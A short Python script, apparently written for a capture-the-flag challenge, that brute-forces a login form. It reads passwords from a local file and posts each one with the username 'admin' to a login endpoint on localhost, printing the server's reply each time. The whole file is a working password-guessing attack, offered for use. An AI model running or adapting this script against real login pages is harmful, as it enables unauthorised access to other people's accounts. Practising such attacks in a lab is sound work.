import webbrowser


file_path = "Challenge1/passwords.txt"
lines = 0
url = 'http://localhost:8080/login'
with open(file_path, "r") as file:
    for line in file:
        print(line.strip())
        line = line[0:len(line)-1]
        import requests
        myobj = {'username': 'admin', 'password': line}
        x = requests.post(url, myobj)
        print(x.text)
        lines += 1



